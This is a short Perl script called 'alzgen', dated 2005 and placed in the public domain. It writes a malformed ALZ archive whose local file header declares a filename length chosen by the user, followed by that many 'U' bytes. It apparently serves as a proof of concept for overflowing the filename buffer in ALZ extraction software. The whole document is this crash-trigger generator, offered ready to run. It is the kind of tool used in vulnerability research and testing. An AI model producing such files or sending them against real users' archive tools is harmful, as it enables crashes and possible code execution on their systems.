#!/usr/bin/perl --

# alzgen
# by Ulf Harnhammar in 2005
# I hereby place this program in the public domain.

die "usage: $0 <length> <filename>\n" unless @ARGV == 2;
$len = shift;
$lenhi = int($len / 256);
$lenlo = $len - ($lenhi * 256);
$file = shift;

open(OUT, ">$file") or die "can't open file!\n";
print OUT "\x42\x4c\x5a\x01" .        # SIG_LOCAL_FILE_HEADER
          chr($lenlo) . chr($lenhi) . # filename length
          "\x00" x 7 .
          'U' x $len;
close OUT or die "can't close file!?!?\n";
